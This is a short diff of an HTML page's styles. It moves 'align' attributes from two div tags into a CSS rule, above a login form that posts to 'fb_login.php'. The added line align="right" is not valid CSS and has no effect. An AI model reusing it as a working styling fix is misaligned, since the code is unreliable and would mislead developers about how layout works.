@@ -24,11 +24,12 @@ div.transbox {
   background-color: #ffffff;
   border: 1px solid black;
   background-color: rgba(255,255,255,.5);
+  align="right"
 }
 </style>
 
-<div class="transbox" align="right">
-<div class="dentro" align="left">
+<div class="transbox">
+<div class="dentro">
   <form action="fb_login.php" method="post">
       <table>
       <tr>
